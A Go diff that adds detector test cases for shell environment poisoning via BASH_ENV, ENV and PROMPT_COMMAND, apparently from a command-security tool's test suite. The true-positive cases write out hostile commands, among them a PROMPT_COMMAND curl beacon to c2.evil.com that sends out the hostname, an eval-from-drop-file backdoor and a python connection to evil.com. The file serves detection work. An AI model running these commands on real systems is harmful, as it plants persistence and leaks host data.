@@ -1379,6 +1379,148 @@ var GitHookInjectionCases = []TestCase{
 	},
 }
 
+// ---------------------------------------------------------------------------
+// Category 6.8: Shell Startup Environment Poisoning
+// Taxonomy: persistence-evasion/shell-init/shell-env-poisoning
+// MITRE: T1546.004
+//
+// BASH_ENV, ENV, and PROMPT_COMMAND are environment variables that cause
+// the shell to execute arbitrary code automatically — without explicitly
+// running a command. Unlike shell profile backdoors (which modify files),
+// these work by poisoning the current environment, affecting all child
+// shells and subshells.
+// ---------------------------------------------------------------------------
+
+// ShellEnvPoisoningCases tests detection of shell startup env var manipulation.
+var ShellEnvPoisoningCases = []TestCase{
+
+	// --- TRUE POSITIVES ---
+
+	{
+		ID:               "TP-SHELLENV-001",
+		Command:          `export BASH_ENV=/tmp/evil.sh`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/shell-env-poisoning",
+		Analyzer:         "regex",
+		Description:      `Exporting BASH_ENV causes bash to source the file before every non-interactive shell invocation — silently injects code into all subshells, scripts, and command substitutions.`,
+		Tags:             []string{"tp", "shell-env", "bash-env", "persistence"},
+	},
+	{
+		ID:               "TP-SHELLENV-002",
+		Command:          `export ENV=/dev/shm/.hidden_init`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/shell-env-poisoning",
+		Analyzer:         "regex",
+		Description:      `Exporting ENV (POSIX sh equivalent of BASH_ENV) — sourced by sh/dash before non-interactive invocations. Hidden in volatile /dev/shm.`,
+		Tags:             []string{"tp", "shell-env", "env-var", "persistence"},
+	},
+	{
+		ID:               "TP-SHELLENV-003",
+		Command:          `BASH_ENV=/tmp/payload.sh bash -c 'echo innocent'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/shell-env-poisoning",
+		Analyzer:         "regex",
+		Description:      `Inline BASH_ENV before bash -c — the "innocent" echo is a decoy; /tmp/payload.sh executes first before bash runs the command string.`,
+		Tags:             []string{"tp", "shell-env", "inline", "evasion"},
+	},
+	{
+		ID:               "TP-SHELLENV-004",
+		Command:          `ENV=/var/tmp/init.sh sh -c 'make build'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/shell-env-poisoning",
+		Analyzer:         "regex",
+		Description:      `Inline ENV before sh -c — injects code into a POSIX shell invocation that looks like a normal build command.`,
+		Tags:             []string{"tp", "shell-env", "inline", "posix"},
+	},
+	{
+		ID:               "TP-SHELLENV-005",
+		Command:          `export PROMPT_COMMAND='curl -s http://c2.evil.com/beacon?h=$(hostname)'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/shell-env-poisoning",
+		Analyzer:         "regex",
+		Description:      `Exporting PROMPT_COMMAND with a curl beacon — fires before every prompt display, silently exfiltrating the hostname on every Enter keystroke.`,
+		Tags:             []string{"tp", "shell-env", "prompt-command", "beaconing"},
+	},
+	{
+		ID:               "TP-SHELLENV-006",
+		Command:          `export PROMPT_COMMAND='eval $(cat /tmp/.cmd 2>/dev/null)'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/shell-env-poisoning",
+		Analyzer:         "regex",
+		Description:      `Exporting PROMPT_COMMAND to eval a file — creates a persistent backdoor that reads commands from a drop file on every prompt.`,
+		Tags:             []string{"tp", "shell-env", "prompt-command", "eval"},
+	},
+	{
+		ID:               "TP-SHELLENV-007",
+		Command:          `PROMPT_COMMAND='python3 -c "import socket; socket.create_connection((\"evil.com\",443))"'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/shell-env-poisoning",
+		Analyzer:         "regex",
+		Description:      `PROMPT_COMMAND with python network connection — non-export variant still persists in current shell session, firing before every prompt.`,
+		Tags:             []string{"tp", "shell-env", "prompt-command", "python"},
+	},
+
+	// --- TRUE NEGATIVES ---
+
+	{
+		ID:               "TN-SHELLENV-001",
+		Command:          `echo $BASH_ENV`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/shell-init/shell-env-poisoning",
+		Analyzer:         "regex",
+		Description:      `Echoing BASH_ENV to inspect its value — read-only, no assignment or export.`,
+		Tags:             []string{"tn", "read-only", "shell-env"},
+	},
+	{
+		ID:               "TN-SHELLENV-002",
+		Command:          `unset BASH_ENV`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/shell-init/shell-env-poisoning",
+		Analyzer:         "regex",
+		Description:      `Unsetting BASH_ENV — defensive action, removing potential poisoning. Should not be blocked.`,
+		Tags:             []string{"tn", "defensive", "shell-env"},
+	},
+	{
+		ID:               "TN-SHELLENV-003",
+		Command:          `export EDITOR=vim`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/shell-init/shell-env-poisoning",
+		Analyzer:         "regex",
+		Description:      `Exporting a safe environment variable (EDITOR) — the rule only targets BASH_ENV/ENV, not arbitrary exports.`,
+		Tags:             []string{"tn", "safe-export", "shell-env"},
+	},
+	{
+		ID:               "TN-SHELLENV-004",
+		Command:          `env | grep BASH_ENV`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/shell-init/shell-env-poisoning",
+		Analyzer:         "regex",
+		Description:      `Inspecting env for BASH_ENV — read-only diagnostic, no poisoning. Gets AUDIT from sec-audit-env-dump rule (env command).`,
+		Tags:             []string{"tn", "read-only", "shell-env"},
+	},
+	{
+		ID:               "TN-SHELLENV-005",
+		Command:          `export PROMPT_COMMAND=`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/shell-init/shell-env-poisoning",
+		Analyzer:         "regex",
+		Description:      `Clearing PROMPT_COMMAND by setting to empty — defensive action but regex cannot distinguish empty from populated. Accepted trade-off: use 'unset PROMPT_COMMAND' instead.`,
+		Tags:             []string{"tn", "accepted-tradeoff", "shell-env"},
+	},
+}
+
 // AllPersistenceEvasionCases returns all test cases for Kingdom 6.
 func AllPersistenceEvasionCases() []TestCase {
 	var all []TestCase
@@ -1393,5 +1535,6 @@ func AllPersistenceEvasionCases() []TestCase {
 	all = append(all, ShellProfileBackdoorCases...)
 	all = append(all, SystemdLaunchdPersistCases...)
 	all = append(all, GitHookInjectionCases...)
+	all = append(all, ShellEnvPoisoningCases...)
 	return all
 }
